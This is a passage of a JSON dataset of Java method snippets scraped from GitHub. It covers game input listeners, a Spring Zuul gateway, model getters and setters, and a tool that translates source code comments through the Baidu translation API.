"MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56721, "method_name": "keyReleased", "class_name": "Input", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void keyReleased(KeyEvent arg0) {\n\t\tkeys[arg0.getKeyCode()] = false;\n\t\tkeyPressed = false;\t\t\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56722, "method_name": "keyTyped", "class_name": "Input", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void keyTyped(KeyEvent arg0) {\n\t\t// \n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56723, "method_name": "mouseClicked", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mouseClicked(MouseEvent arg0) {\n\t\t// \n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56724, "method_name": "mouseEntered", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mouseEntered(MouseEvent arg0) {\n\t\t// \n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56725, "method_name": "mouseExited", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mouseExited(MouseEvent arg0) {\n\t\t// \n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56726, "method_name": "mousePressed", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mousePressed(MouseEvent arg0) {\n\t\tmouseClicked = true;\n\t\tif(arg0.getButton() == MouseEvent.BUTTON1) {\n\t\t\tleftMouseDown = true;\n\t\t}\n\t\tif(arg0.getButton() == MouseEvent.BUTTON2) {\n\t\t\tmiddleMouseDown = true;\n\t\t}\n\t\tif(arg0.getButton() == MouseEvent.BUTTON3) {\n\t\t\trightMouseDown = true;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56727, "method_name": "mouseReleased", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mouseReleased(MouseEvent arg0) {\n\t\tmouseClicked = false;\n\t\tleftMouseDown = false;\n\t\tmiddleMouseDown = false;\n\t\trightMouseDown = false;\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56728, "method_name": "mouseDragged", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mouseDragged(MouseEvent arg0) {\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56729, "method_name": "mouseMoved", "class_name": "Input", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void mouseMoved(MouseEvent arg0) {\n\t\tmouseX = arg0.getX();\n\t\tmouseY = arg0.getY();\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56730, "method_name": "getMouse", "class_name": "Input", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Vector2", "snippet": "\tpublic static Vector2 getMouse() {\n\t\treturn new Vector2(mouseX, mouseY);\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56731, "method_name": "isKeyPressed", "class_name": "Input", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean isKeyPressed(int keyCode) {\n\t\treturn keys[keyCode];\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56732, "method_name": "mouseIn", "class_name": "Input", "params": ["GameObject"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean mouseIn(GameObject obj) {\t\t\n\t\tif(obj.getComponent(\"Box Collider\") != null) {\n\t\t\tBoxCollider col = (BoxCollider) obj.getComponent(\"Box Collider\");\n\t\t\tif(col.getCollider().contains(new Point(getMouse().getX(), getMouse().getY()))) {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\t\t\n\t\treturn false;\t\t\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Input.java", "stars": "33", "class_props": {"extends": null, "implements": ["KeyListener", "MouseMotionListener", "MouseListener"], "modifiers": ["public"]}}, {"id": 56733, "method_name": "main", "class_name": "ZuulServerApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(ZuulServerApplication.class, args);\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-zuul-service/src/main/java/com/iiht/stock/zuul/ZuulServerApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56734, "method_name": "accessFilter", "class_name": "ZuulServerApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AccessFilter", "snippet": "\tpublic AccessFilter accessFilter(){\n\t\treturn new AccessFilter();\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-zuul-service/src/main/java/com/iiht/stock/zuul/ZuulServerApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56735, "method_name": "getRestTemplate", "class_name": "ZuulServerApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RestTemplate", "snippet": "\tpublic RestTemplate getRestTemplate() {\n\t\tRestTemplate template = new RestTemplate();\n\t\tList<ClientHttpRequestInterceptor> interceptors = template.getInterceptors();\n\t\tif (interceptors == null) {\n\t\t\tinterceptors = new ArrayList<ClientHttpRequestInterceptor>();\n\t\t}\n\t\t\n\t\tinterceptors.add(new UserContextInterceptor());\n\t\ttemplate.setInterceptors(interceptors);\n\t\treturn template;\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-zuul-service/src/main/java/com/iiht/stock/zuul/ZuulServerApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56736, "method_name": "getKey", "class_name": "Genre", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getKey() {\n        return mKey;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/models/Genre.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56737, "method_name": "getLabelId", "class_name": "Genre", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLabelId() {\n        return mLabel;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/models/Genre.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56738, "method_name": "year", "class_name": "SystemTerraformingEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String year() {\n        return UserPreferences.displayYear() ? str(galaxy().beginningYear() + turn) : str(turn+1);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/events/SystemTerraformingEvent.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable", "StarSystemEvent"], "modifiers": ["public"]}}, {"id": 56739, "method_name": "description", "class_name": "SystemTerraformingEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description() {\n        return text(key);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/events/SystemTerraformingEvent.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable", "StarSystemEvent"], "modifiers": ["public"]}}, {"id": 56740, "method_name": "main", "class_name": "Bark", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n    \t//\u6307\u5b9a\u5f85\u7ffb\u8bd1\u7684\u6e90\u4ee3\u7801\u76ee\u5f55\n    \tString inputPath = \"C:\\\\Users\\\\Leon\\\\Documents\\\\\u4e00\u4e9b\u4f5c\u54c1\\\\\u6e90\u7801\u5373\u6559\u7a0b\\\\\u6e90\u7801\\\\\u529f\u80fd\u6027\u6d4b\u8bd5\u6e90\u7801\\\\spark-part\\\\\";//\u4f8b\u5b50\n    \t//\u6307\u5b9a\u5904\u7406\u5b8c\u7684\uff08\u7ffb\u8bd1\u51fa\u7684\uff09\u7ed3\u679c\u6587\u4ef6\u5b58\u653e\u8def\u5f84\n\t\tString outputPath = \"C:\\\\Users\\\\Leon\\\\Documents\\\\\u4e00\u4e9b\u4f5c\u54c1\\\\\u6e90\u7801\u5373\u6559\u7a0b\\\\\u8f93\u51fa\\\\\u529f\u80fd\u6027\u6d4b\u8bd5\u6e90\u7801\\\\\";//\u4f8b\u5b50\n\t\tbeachTranslateSourceCode(inputPath,outputPath);\n    }", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56741, "method_name": "beachTranslateSourceCode", "class_name": "Bark", "params": ["String", "String"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "\tstatic void beachTranslateSourceCode(String inputPath,String outputPath) {\n\t\tFile file = new File(inputPath);\n\t\tFile [] files = file.listFiles();\n\t\tfor(File f:files) {\n\t\t\tString name = f.getName();\n\t\t\tif(f.isDirectory()) {\n\t\t\t\tString newOutputPath = outputPath + \"\\\\\" + name +\"\\\\\";\n\t\t\t\tString newInputPath = inputPath + name + \"\\\\\";\n\t\t\t\tSystem.out.println(\"\u521b\u5efa\u76ee\u5f55\uff1a\" + newInputPath);\n\t\t\t\tnew File(newOutputPath).mkdir();\n\t\t\t\t//\u9012\u5f52\u8c03\u7528\u5f53\u524d\u65b9\u6cd5\n\t\t\t\tbeachTranslateSourceCode(newInputPath,newOutputPath);\n\t\t\t\t//\u5b9a\u4e49\u652f\u6301\u7684\u6e90\u7801\u7c7b\u578b\n\t\t\t}else if(name.endsWith(\".java\") \n\t\t\t\t\t|| name.endsWith(\".scala\")\n\t\t\t\t\t|| name.endsWith(\".go\")\n\t\t\t\t\t|| name.endsWith(\".c\")\n\t\t\t\t\t|| name.endsWith(\".c++\")\n\t\t\t\t\t||name.endsWith(\".cs\")\n\t\t\t\t\t|| name.endsWith(\".kt\")\n\t\t\t\t\t|| name.endsWith(\".php\")\n\t\t\t\t\t|| name.endsWith(\".js\")) {\n\t\t\t\t//\u626b\u63cf\u5230\u8fd9\u4e9b\u7c7b\u578b\u7684\u6587\u4ef6\u5219\u7ffb\u8bd1\n\t\t\t\tSystem.out.println(\"\u5f00\u59cb\u7ffb\u8bd1 \" + inputPath + name);\n\t\t\t\ttranslateSourceCode(inputPath + name,outputPath + \"\" + name);\n\t\t\t}else{\n\t\t\t\t//\u5426\u5219\u8fdb\u884c\u590d\u5236\n\t\t\t\tSystem.out.println(\"\u5f00\u59cb\u590d\u5236 \" + inputPath + name);\n\t\t\t\tjustCopyOtherSourceFile(inputPath + name,outputPath + \"\" + name);\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56742, "method_name": "translateSourceCode", "class_name": "Bark", "params": ["String", "String"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void translateSourceCode(String inputFile,String outputFile) {\n\t\tFile file = new File(inputFile);\n\t\tString line = null;\n\t\t//\u6574\u7bc7\u6587\u6863\u5b58\u5165\u4e00\u4e2aStringBuffer\u4e2d\uff0c\u539f\u6765\u7684\u6bcf\u884c\u5185\u5bb9\u73b0\u5728\u4ee5\"\\n\"\u5206\u9694\n\t\tStringBuffer originalAllLinesToOneSB = new StringBuffer();\n\t\ttry {\n\t\t\tBufferedReader originalAllLines = new BufferedReader(new FileReader(file));\n\t\t\twhile((line = originalAllLines.readLine()) != null) {\n\t\t\t\toriginalAllLinesToOneSB.append(\"\\n\"+line);\n\t\t\t}\n\t\t\toriginalAllLines.close();\n\t\t\t//\u5c06\u4e0a\u9762originalAllLinesToOneSB \u5b58\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u4e2d\n\t\t\tString[] linesStrArray = originalAllLinesToOneSB.toString().split(\"\\n\");\n\t\t\t//\u5728\u5168\u6587\u4e2d\u5c06\u9700\u8981\u7ffb\u8bd1\u7684\u591a\u884c\u6ce8\u91ca\"/*   **\u5185\u5bb9**   */\"\u6574\u7406\u81f3\u4e00\u884c\u4e2d\n\t\t\tStringBuffer linesSBN2One = new StringBuffer(\"\");\n\t\t\tStringBuffer toTranslate = new StringBuffer(\"\");\n\t\t\tfor(String oneLine : linesStrArray) {\n\t\t\t\tif(oneLine.contains(\"*\") && (!oneLine.contains(\"*/\"))){\n\t\t\t\t\ttoTranslate.append(oneLine);\n\t\t\t\t}else if(oneLine.contains(\"*/\")) {\n\t\t\t\t\ttoTranslate.append(oneLine);//\u6dfb\u52a0\u6700\u540e\u4e00\u884c\u5185\u5bb9\n\t\t\t\t\tString annotateN2One = toTranslate.toString().replace(\"/*\", \"xfuckx\").replace(\"*/\", \"xduangx\").replace(\"*\", \"\").replace(\"xfuckx\", \"/*\").replace(\"xduangx\",\"*/\");//\u5207\u9664\u8bb8\u591a*\n\t\t\t\t\ttoTranslate = new StringBuffer(\"\");\n\t\t\t\t\tlinesSBN2One.append(\"\\n\"+annotateN2One);\n\t\t\t\t}else {\n\t\t\t\t\tlinesSBN2One.append(\"\\n\"+oneLine);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t//\u5c06\u6574\u7406\uff08\u591a\u884c\u6ce8\u89e3\u6574\u7406\u5230\u540c\u4e00\u884c\uff09\u540e\u7684\u5168\u6587\u8f6c\u4e3a\u5b57\u7b26\u4e32\u6570\u7ec4\n\t\t\tString[] linesArr = linesSBN2One.toString().split(\"\\n\");\n\t\t\t//\u5c06\u6240\u6709\u9700\u8981\u7ffb\u8bd1\u7684\u5185\u5bb9\u653e\u5165\u4e00\u4e2aStringBuffer \uff1aall2TransSB\n\t\t\tStringBuffer all2TransSB = new StringBuffer(\"\");\n\t\t\tfor(String tmpStr:linesArr) {\n\t\t\t\tif(tmpStr.contains(\"//\") || tmpStr.contains(\"/*\")) {\n\t\t\t\t\tall2TransSB.append(\"\\n\"+tmpStr);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t//\u5206\u6bb5\u7ffb\u8bd1\uff0c\u4e00\u6bb5\u5185\u5bb9\u7684\u957f\u5ea6\u57286K\u5b57\u8282\u4ee5\u5185\uff08\u6211\u7533\u8bf7\u7684\u767e\u5ea6\u7ffb\u8bd1\u662f\u514d\u8d39\u7248\u672c\uff0c\u9650\u5236\u4e3a\u6bcf\u79d2\u53ea\u80fd\u8bf7\u6c42\u4e00\u6b21\uff0c\u6bcf\u6b21\u8bf7\u6c42\u7684\u7ffb\u8bd1\u6587\u672c\u91cf\u9700\u57286000\u5b57\u8282\u4ee5\u5185\uff09\n\t\t\t//\u4f7f\u7528\u524d\u8bf7\u81ea\u884c\u7533\u8bf7baidu\u7ffb\u8bd1\u7684\u201c\u901a\u7528\u7ffb\u8bd1API\u201d\uff0c\u5207\u8bb0\uff1a\u9009\u62e9\u514d\u8d39\u7248\uff0c\u4e0d\u8981\u9009\u62e9\u6709\u6d41\u91cf\u4e0a\u9650\u8d85\u9650\u6536\u8d39\u7684\u90a3\u79cd\u3002\uff08\u94b1\u591a\u7684\u8bf7\u9009\u62e9\u6700\u9ad8\u89c4\u683c\u7684\u7248\u672c\uff0c\u6027\u80fd\u66f4\u5c4c\uff0c\u4e0d\u8fc7\u5f53\u524d\u7248\u672c\u53d1\u6325\u4e0d\u51fa\u6765\uff09\n\t\t\t//\u5c06\u6240\u6709\u5f85\u7ffb\u8bd1\u7684\u5185\u5bb9\u5b58\u5165\u5b57\u7b26\u4e32\u6570\u7ec4\n\t\t\tString[] linesArr2 = all2TransSB.toString().split(\"\\n\");\n\t\t\t//\u7528\u6765\u63a7\u5236\u4e00\u6b21\u7684\u5b9e\u9645\u7ffb\u8bd1\u91cf\n\t\t\tStringBuffer toTranslateOnce = new StringBuffer(\"\");\n\t\t\t//\u7528\u6765\u5b58\u653e\u7ffb\u8bd1\u8fc7\u7684\u5185\u5bb9\n\t\t\tStringBuffer translatedSB = new StringBuffer(\"\");\n\t\t\tfor(String tmpStr:linesArr2) {\n\t\t\t\tif(toTranslateOnce.length() + tmpStr.length() > 6000) {\n\t\t\t\t\t//\u7ffb\u8bd1\u3001\u6e05\u7a7a\u3001\u518d\u6dfb\u52a0\n\t\t\t\t\ttranslatedSB.append(\"\\n\"+useBDTBatch(toTranslateOnce.toString()));//\u7ffb\u8bd1\n\t\t\t\t\ttoTranslateOnce = new StringBuffer(\"\");//\u6e05\u7a7a\n\t\t\t\t\ttoTranslateOnce.append(\"\\n\"+tmpStr);//\u6dfb\u52a0\n\t\t\t\t}else {\n\t\t\t\t\ttoTranslateOnce.append(\"\\n\"+tmpStr);//\u6dfb\u52a0\n\t\t\t\t}\n\t\t\t}\n\t\t\t//\u7ed3\u675f\u524d\u7ffb\u8bd1\u5269\u4e0b\u7684\u5185\u5bb9\n\t\t\ttranslatedSB.append(\"\\n\"+useBDTBatch(toTranslateOnce.toString()));//\u7ffb\u8bd1\n\t\t\t//\u7ffb\u8bd1\u4e4b\u540e\u7684\u5185\u5bb9\u8f6c\u4e3a\u5b57\u7b26\u4e32\u6570\u7ec4\n\t\t\tString[] translatedArr = translatedSB.toString().split(\"\\n\");\n\t\t\t//\u5c06\u5185\u5bb9\u653e\u56de\u6574\u7406\u540e\u7684\u5168\u6587\u5b57\u7b26\u4e32\u6570\u7ec4linesArr\u4e2d\n\t\t\tint indexOfTranslated = 2;//\u7ffb\u8bd1\u540e\u7684\u7ed3\u679c\u96c6\uff0c\u521d\u59cb\u503c\u4e3a\u9700\u8981\u8df3\u8fc7\u7684\u7ffb\u8bd1\u7ed3\u679c\u4e2d\u7684\u7a7a\u7ed3\u679c\n\t\t\tfor(int x = 0; x <linesArr.length; x ++) {\n\t\t\t\tif(linesArr[x].contains(\"//\") || linesArr[x].contains(\"/*\")) {\n\t\t\t\t\tlinesArr[x] = translatedArr[indexOfTranslated];\n\t\t\t\t\tindexOfTranslated ++;\n\t\t\t\t}\n\t\t\t}\n\t\t\t//\u5c06\u5199\u5165\u4e86\u5df2\u7ffb\u8bd1\u5185\u5bb9\u7684\u5168\u6587\u5b57\u7b26\u4e32\u6570\u7ec4linesArr\u8f6c\u4e3aStringBuffer\u8fdb\u800c\u8f6c\u4e3aString\uff0c\u8f93\u51fa\u5230\u6587\u4ef6\n\t\t\tStringBuffer toOutput = new StringBuffer(\"\");\n\t\t\tfor(String str:linesArr) {\n\t\t\t\ttoOutput.append(\"\\n\"+str);\n\t\t\t}\n\t\t\t//\u8f93\u51fa\u5230\u6587\u4ef6\n\t\t\twriteFile(toOutput.toString(),outputFile);\n\t\t\tSystem.out.println(\"finished !\");\n\t\t} catch (Exception e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56743, "method_name": "useBDTBatch", "class_name": "Bark", "params": ["String"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String useBDTBatch(String input) {\n        TransApi api = new TransApi(APP_ID, SECURITY_KEY);\n        try {\n\t\t\tThread.sleep(1000);//\u53d7\u9650\u4e8e\u5f53\u524d\u7684\u767e\u5ea6\u7ffb\u8bd1\u8d26\u53f7\u7248\u672c\uff0c\u6bcf\u79d2\u53ea\u80fd\u8bf7\u6c421\u6b21\uff0c\u6545\u5728\u6b64\u8fdb\u7a0b\u7761\u77201\u79d2\n\t\t} catch (InterruptedException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n        //\u4e00\u6b21\u7ffb\u8bd1\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u7ed3\u679c\n        String res = api.getTransResult(input, \"auto\", \"zh\");\n        //\u7528\u6765\u5b58\u653e\u7ffb\u8bd1\u540e\u7684\u591a\u884c\u7ed3\u679c\u96c6\n        StringBuffer out = new StringBuffer(\"\");\n        //\u7ed3\u679c\u89e3\u6790\u6210\u81ea\u5b9a\u4e49\u7ed3\u6784\u7684\u5217\u8868\uff0c\u8fd9\u91cc\u5b9a\u4e49\u4e86\u4e00\u4e2aResoult\u7c7b\n        List<Resoult> resultList = JSON.parseArray(\"[\"+res+\"]\", Resoult.class);\n        //\u4eceresultList\u4e2d\u63d0\u53d6\u51fa\u7ffb\u8bd1\u7ed3\u679c\u5b57\u7b26\u4e32\uff0c\u4f5c\u4e3a\u8f93\u51fa\n        for (Resoult ares : resultList) {\n        \tfor(TransResult tr:ares.transResult) {\n        \t\tout.append(\"\\n\"+tr.dst);\n        \t}\n        }\n        return out.toString();\n    }", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56744, "method_name": "writeFile", "class_name": "Bark", "params": ["String", "String"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "\tstatic void writeFile(String content,String fileName) {\n\t    File file =new File(fileName);\n\t\ttry {\n\t\t\tif(!file.exists()){\n\t        \tfile.createNewFile();\n\t        }\n\t        Writer fileWritter = new FileWriter(file);\n\t\t\tBufferedWriter bw = new BufferedWriter(fileWritter);\n\t\t\tbw.write(content);\n\t\t    bw.close();\n\t\t} catch (IOException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56745, "method_name": "justCopyOtherSourceFile", "class_name": "Bark", "params": ["String", "String"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "\tstatic void justCopyOtherSourceFile(String inputFile,String outputFile) {\n\t\tFile file = new File(inputFile);\n\t\tString line = null;\n\t\tStringBuffer thisCode = new StringBuffer();\n\t\ttry {\n\t\t\tBufferedReader br = new BufferedReader(new FileReader(file));\n\t\t\twhile((line = br.readLine()) != null) {\n\t\t\t\tthisCode.append(\"\\n\"+line);\n\t\t\t}\n\t\t\tbr.close();\n\t\t\twriteFile(thisCode.toString(),outputFile);\n\t\t\tSystem.out.println(\"copyed !\");\n\t\t} catch (Exception e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56746, "method_name": "getFrom", "class_name": "Resoult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getFrom() {\n\t\t\treturn from;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56747, "method_name": "setFrom", "class_name": "Resoult", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setFrom(String from) {\n\t\t\tthis.from = from;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56748, "method_name": "getTo", "class_name": "Resoult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getTo() {\n\t\t\treturn to;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56749, "method_name": "setTo", "class_name": "Resoult", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setTo(String to) {\n\t\t\tthis.to = to;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56750, "method_name": "getTrans_result", "class_name": "Resoult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TransResult", "snippet": "\t\tpublic TransResult[] getTrans_result() {\n\t\t\treturn transResult;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56751, "method_name": "setTrans_result", "class_name": "Resoult", "params": ["TransResult"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setTrans_result(TransResult[] transResult) {\n\t\t\tthis.transResult = transResult;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56752, "method_name": "getSrc", "class_name": "TransResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getSrc() {\n\t\t\treturn src;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56753, "method_name": "setSrc", "class_name": "TransResult", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setSrc(String src) {\n\t\t\tthis.src = src;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56754, "method_name": "getDst", "class_name": "TransResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getDst() {\n\t\t\treturn dst;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56755, "method_name": "setDst", "class_name": "TransResult", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setDst(String dst) {\n\t\t\tthis.dst = dst;\n\t\t}", "url": "https://raw.githubusercontent.com/LeonRain/wangwang/master/wangwang/src/main/java/com/leon/wangwang/Bark.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 56756, "method_name": "getName", "class_name": "money_split_data", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/money_split_data.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": 